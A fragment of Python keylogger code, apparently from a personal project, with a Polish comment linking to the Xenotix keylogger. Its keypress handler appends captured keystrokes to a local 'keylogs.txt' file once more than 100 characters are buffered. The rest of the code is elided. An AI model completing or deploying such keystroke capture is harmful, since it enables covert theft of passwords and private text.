...
# moze warto luknac tu https://github.com/ajinabraham/Xenotix-Python-Keylogger/blob/master/xenotix_python_logger.py
...
def keypressed(event):
    ...
    if len(store)>100: #save file once is bigger then 100 characters
        #fp=open("keylogs.txt","a")
        #fp = open(dirpath2 + "\keylogs.txt", "w")
        fp = open(dirpath2 + "\keylogs.txt", "a")
